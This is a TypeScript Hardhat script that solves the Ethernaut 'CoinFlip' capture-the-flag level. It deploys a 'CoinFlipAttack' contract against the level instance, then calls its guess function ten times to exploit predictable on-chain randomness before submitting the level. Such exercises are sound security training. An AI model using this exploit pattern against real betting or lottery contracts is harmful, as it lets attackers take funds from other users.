import { Contract, Signer } from "ethers";
import fs from "fs";
import { ethers } from "hardhat";

let ethernautContract: Contract;
let signer: Signer;

const ethernautAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33";
const ethernautABI = JSON.parse(
  fs.readFileSync("abis/ethernaut.json").toString()
);

const deployContract = async <ContractType extends Contract>(
  contractName: string,
  args: any[],
  signer?: Signer
): Promise<ContractType> => {
  return (await (
    await ethers.getContractFactory(contractName, signer)
  ).deploy(...args)) as ContractType;
};

const createLevelInstance = async (): Promise<string> => {
  const levelAddress = "0x4dF32584890A0026e56f7535d0f2C6486753624f";

  const txResponse = await ethernautContract.createLevelInstance(levelAddress);
  console.log("Create instance tx:", txResponse.hash);

  const txReceipt = await txResponse.wait();
  console.log("Tx mined!");
  console.log(JSON.stringify(txReceipt, null, 2));
  const instanceAddress = ethers.utils.hexZeroPad(
    ethers.utils.hexStripZeros(txReceipt.logs[0].data),
    20
  );
  console.log("Level instance address", instanceAddress);
  return instanceAddress;
};

const loadOrCreateLevelInstance = async (name: string) => {
  let instanceAddress = "";
  const fileName = `/tmp/address_${name}`;
  try {
    instanceAddress = fs.readFileSync(fileName).toString();
    console.log(
      `Using cached level instance ${instanceAddress} from ${fileName}`
    );
  } catch (error) {
    instanceAddress = await createLevelInstance();
    fs.writeFileSync(fileName, instanceAddress);
  }
  return instanceAddress;
};

const deployAttack = async (targetAddress: string) => {
  const contract = await deployContract<Contract>(
    "CoinFlipAttack",
    [targetAddress],
    (
      await ethers.getSigners()
    )[0] as Signer
  );
  return contract.address;
};

const loadOrDeployAttack = async (name: string, targetAddress: string) => {
  let instanceAddress = "";
  const fileName = `/tmp/address_${name}`;
  try {
    instanceAddress = fs.readFileSync(fileName).toString();
    console.log(
      `Using cached attack instance ${instanceAddress} from ${fileName}`
    );
  } catch (error) {
    instanceAddress = await deployAttack(targetAddress);
    fs.writeFileSync(fileName, instanceAddress);
  }
  return instanceAddress;
};

const main = async () => {
  signer = (await ethers.getSigners())[0] as Signer;

  ethernautContract = new ethers.Contract(
    ethernautAddress,
    ethernautABI,
    signer as any
  );

  const targetAddress = await loadOrCreateLevelInstance("coinflip");
  const attackerAddress = await loadOrDeployAttack(
    "coinflip_attack",
    targetAddress
  );

  const attackContract = (
    await ethers.getContractFactory("CoinFlipAttack", signer)
  ).attach(attackerAddress);

  const targetContract = (await ethers.getContractFactory("CoinFlip")).attach(
    targetAddress
  );

  for (let i = 0; i < 10; i++) {
    const guessTx = await attackContract.guess({ gasLimit: 200_000 });
    console.log("guess tx hash", guessTx.hash);
    const guessReceipt = await guessTx.wait();
    console.log(JSON.stringify(guessReceipt, null, 2));

    console.log(
      "Consecutive wins: ",
      (await targetContract.consecutiveWins()).toString()
    );
  }

  const submitTx = await ethernautContract.submitLevelInstance(targetAddress);
  const submitReceipt = await submitTx.wait();

  console.log(JSON.stringify(submitReceipt, null, 2));
};

main()
  .then(() => process.exit())
  .catch((e) => {
    console.error(e);
    process.exit(1);
  });
